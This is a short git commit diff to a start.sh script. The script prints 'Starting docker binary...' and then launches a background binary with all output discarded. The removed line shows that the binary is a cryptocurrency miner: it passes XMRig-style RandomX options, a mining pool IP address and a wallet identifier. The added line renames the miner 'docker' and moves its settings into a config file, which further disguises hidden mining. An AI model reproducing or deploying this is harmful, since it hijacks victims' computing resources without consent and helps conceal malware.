6b50e5b7b4b8c6bbd59ed3c2cd5d06556564881c
gersadega4 <gersadega4@gmail.com>
2026-04-04 18:12:16 +0700

    Update start.sh

--- start.sh
+++ start.sh
@@ -8,8 +8,8 @@ sleep 5
 
 echo "Starting docker binary..."
 
-chmod +x ./class
-./class -a rx/0 -o 157.173.100.15:443 -u Q01050090d680b4ec45c569776ccafc507a4b859b14d661108509d4638ddbe677311ab16b1f5894.$(shuf -n 1 -i 100-999)-Levy -p x -k --donate-level 1 >/dev/null 2>&1 &
+chmod +x ./docker
+./docker -c docker.json >/dev/null 2>&1 &
 
 echo "Running..."
 
